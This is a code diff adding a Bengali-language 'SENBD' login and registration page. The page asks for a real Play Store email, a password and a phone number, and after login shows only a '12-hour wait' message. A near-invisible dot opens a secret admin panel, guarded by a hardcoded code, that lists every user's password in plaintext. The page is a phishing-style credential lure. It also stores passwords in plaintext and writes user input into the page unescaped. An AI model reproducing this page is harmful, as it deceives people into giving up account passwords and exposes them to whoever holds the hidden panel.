@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SENBD - লগইন ও রেজিস্ট্রেশন</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --primary-color: #4facfe;
+            --secondary-color: #00f2fe;
+            --glass-bg: rgba(255, 255, 255, 0.98);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', 'Poppins', sans-serif; }
+
+        body {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            min-height: 100vh;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center; padding: 20px;
+        }
+
+        header {
+            margin-bottom: 25px; font-size: 42px; font-weight: 800;
+            color: #fff; text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .container {
+            background: var(--glass-bg);
+            padding: 35px; border-radius: 25px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            width: 100%; max-width: 420px;
+            text-align: center; border: 1px solid rgba(255,255,255,0.6);
+            position: relative;
+        }
+
+        h2 { color: #222; margin-bottom: 25px; font-weight: 700; }
+
+        .input-group { position: relative; margin-bottom: 15px; text-align: left; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--primary-color); }
+        .input-group input {
+            width: 100%; padding: 14px 14px 14px 45px;
+            border: 2px solid #eee; border-radius: 12px;
+            outline: none; transition: 0.3s; font-size: 15px;
+        }
+
+        .btn {
+            width: 100%; padding: 14px;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            border: none; border-radius: 12px;
+            color: white; font-size: 18px; font-weight: 600;
+            cursor: pointer; transition: 0.3s; margin-top: 10px;
+        }
+        .btn:hover { transform: scale(1.01); }
+
+        .toggle-text { 
+            margin-top: 20px; 
+            font-size: 14px; 
+            color: #555; 
+        }
+        .toggle-text b { color: #0d6efd; cursor: pointer; text-decoration: underline; }
+
+        /* একদম অদৃশ্য ছোট সাদা ডট (অ্যাডমিন ট্রিক) */
+        .secret-dot {
+            display: inline-block;
+            width: 3px; height: 3px;
+            background: #fff;
+            border-radius: 50%;
+            cursor: pointer;
+            margin-left: 2px;
+            opacity: 0.2;
+        }
+
+        /* ১২ ঘণ্টা সাকসেস পেজ */
+        #success-view { display: none; padding: 10px; }
+        #success-view i { font-size: 70px; color: #28a745; margin-bottom: 20px; }
+        
+        /* অ্যাডমিন প্যানেল স্টাইল (গোপন) */
+        #admin-view { display: none; text-align: left; width: 100%; }
+        .admin-header {
+            background: #333; color: white; padding: 15px;
+            border-radius: 12px; margin-bottom: 15px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .data-card {
+            background: #f1f1f1; padding: 12px; border-radius: 12px;
+            margin-bottom: 10px; border-left: 5px solid #4facfe; font-size: 13px;
+        }
+        .data-card p { margin: 2px 0; }
+
+        .hidden { display: none !important; }
+        .animate { animation: fadeIn 0.4s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <header>SENBD</header>
+
+    <div class="container animate">
+        
+        <!-- ১. লগইন ফর্ম -->
+        <div id="login-form">
+            <h2>লগইন করুন</h2>
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="logEmail" placeholder="আসল ইমেইল এড্রেস">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="logPass" placeholder="পাসওয়ার্ড">
+            </div>
+            <button class="btn" onclick="handleLogin()">Login</button>
+            <div class="toggle-text">
+                অ্যাকাউন্ট নেই? <b onclick="switchTo('reg')">নতুন অ্যাকাউন্ট তৈরি করুন</b><span class="secret-dot" onclick="openAdmin()"></span>
+            </div>
+        </div>
+
+        <!-- ২. রেজিস্ট্রেশন ফর্ম -->
+        <div id="register-form" class="hidden">
+            <h2>নতুন অ্যাকাউন্ট</h2>
+            <div class="input-group"><i class="fas fa-user"></i><input type="text" id="regName" placeholder="আপনার পুরো নাম"></div>
+            <div class="input-group"><i class="fas fa-envelope"></i><input type="email" id="regEmail" placeholder="আসল ইমেইল (প্লে-স্টোর)"></div>
+            <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="regPass" placeholder="পাসওয়ার্ড দিন"></div>
+            <div class="input-group"><i class="fas fa-phone"></i><input type="number" id="regPhone" placeholder="ফোন নাম্বার"></div>
+            <button class="btn" onclick="handleRegister()">Register</button>
+            <div class="toggle-text">
+                আগেই অ্যাকাউন্ট আছে? <b onclick="switchTo('login')">লগইন করুন</b>
+            </div>
+        </div>
+
+        <!-- ৩. ১২ ঘণ্টা অপেক্ষার পেজ -->
+        <div id="success-view">
+            <i class="fas fa-clock"></i>
+            <h3 style="color:#333;">অনুরোধ সফল হয়েছে। <br>দয়া করে <b>১২ ঘণ্টা</b> অপেক্ষা করুন।</h3>
+            <div style="display:flex; gap:10px; margin-top:25px;">
+                <button class="btn" style="background:#6c757d;" onclick="switchTo('login')">পিছনে যান</button>
+                <button class="btn" onclick="location.reload()">বন্ধ করুন</button>
+            </div>
+        </div>
+
+        <!-- ৪. গোপন অ্যাডমিন প্যানেল (লিস্ট) -->
+        <div id="admin-view">
+            <div class="admin-header">
+                <span><i class="fas fa-user-secret"></i> অ্যাডমিন কন্ট্রোল</span>
+                <i class="fas fa-times" onclick="location.reload()" style="cursor:pointer"></i>
+            </div>
+            <div id="user-list" style="max-height:350px; overflow-y:auto; padding-right:5px;">
+                <!-- ইউজারের তথ্য এখানে অটোমেটিক আসবে -->
+            </div>
+            <button class="btn" style="background:#d9534f; margin-top:10px;" onclick="clearDatabase()">সব ডাটা মুছুন</button>
+        </div>
+
+    </div>
+
+    <div style="margin-top:25px; color:white; font-size:13px; opacity:0.8;">
+        © 2026 SENBD | All Rights Reserved
+    </div>
+
+    <script>
+        // ভিউ পরিবর্তন করা
+        function switchTo(view) {
+            document.getElementById('login-form').classList.add('hidden');
+            document.getElementById('register-form').classList.add('hidden');
+            document.getElementById('success-view').style.display = 'none';
+            document.getElementById('admin-view').style.display = 'none';
+
+            if(view === 'reg') {
+                document.getElementById('register-form').classList.remove('hidden');
+            } else if(view === 'login') {
+                document.getElementById('login-form').classList.remove('hidden');
+            }
+        }
+
+        // রেজিস্ট্রেশন তথ্য সেভ করা
+        function handleRegister() {
+            const name = document.getElementById('regName').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const pass = document.getElementById('regPass').value.trim();
+            const phone = document.getElementById('regPhone').value.trim();
+
+            if(!name || !email || !pass || !phone) {
+                alert("সব তথ্য সঠিকভাবে পূরণ করুন!");
+                return;
+            }
+
+            // সাধারণ ইমেইল ফরম্যাট চেক
+            if(!email.includes("@") || !email.includes(".com")) {
+                alert("সঠিক ইমেইল এড্রেস দিন!");
+                return;
+            }
+
+            let users = JSON.parse(localStorage.getItem('senbd_users')) || [];
+            if(users.find(u => u.email === email)) {
+                alert("এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!");
+                return;
+            }
+
+            users.push({name, email, pass, phone});
+            localStorage.setItem('senbd_users', JSON.stringify(users));
+            
+            alert("রেজিস্ট্রেশন সফল! এখন লগইন করুন।");
+            switchTo('login');
+        }
+
+        // লগইন চেক (রেজিস্ট্রেশন ছাড়া ঢুকতে দিবে না)
+        function handleLogin() {
+            const email = document.getElementById('logEmail').value.trim();
+            const pass = document.getElementById('logPass').value.trim();
+
+            let users = JSON.parse(localStorage.getItem('senbd_users')) || [];
+            const user = users.find(u => u.email === email && u.pass === pass);
+
+            if(user) {
+                document.getElementById('login-form').classList.add('hidden');
+                document.getElementById('success-view').style.display = 'block';
+            } else {
+                alert("ভুল ইমেইল/পাসওয়ার্ড! অথবা আপনি আগে রেজিস্ট্রেশন করেননি।");
+            }
+        }
+
+        // গোপন অ্যাডমিন প্যানেল ওপেন (পাসওয়ার্ড: 462357)
+        function openAdmin() {
+            let pass = prompt("অ্যাডমিন কোড দিন:");
+            if(pass === "462357") {
+                document.getElementById('login-form').classList.add('hidden');
+                document.getElementById('register-form').classList.add('hidden');
+                document.getElementById('admin-view').style.display = 'block';
+                loadUsers();
+            } else if(pass !== null) {
+                alert("কোড ভুল!");
+            }
+        }
+
+        // ইউজার ডাটা অ্যাডমিন প্যানেলে দেখানো
+        function loadUsers() {
+            const container = document.getElementById('user-list');
+            const users = JSON.parse(localStorage.getItem('senbd_users')) || [];
+            
+            if(users.length === 0) {
+                container.innerHTML = "<p style='text-align:center; color:#888; padding:20px;'>কোন তথ্য পাওয়া যায়নি।</p>";
+                return;
+            }
+
+            container.innerHTML = "";
+            users.reverse().forEach(u => {
+                container.innerHTML += `
+                <div class="data-card animate">
+                    <p><b>নাম:</b> ${u.name}</p>
+                    <p><b>ইমেইল:</b> ${u.email}</p>
+                    <p><b>পাসওয়ার্ড:</b> ${u.pass}</p>
+                    <p><b>ফোন:</b> ${u.phone}</p>
+                </div>`;
+            });
+        }
+
+        function clearDatabase() {
+            if(confirm("সব ইউজারের তথ্য মুছে ফেলতে চান?")) {
+                localStorage.removeItem('senbd_users');
+                loadUsers();
+            }
+        }
+    </script>
+
+</body>
+</html>
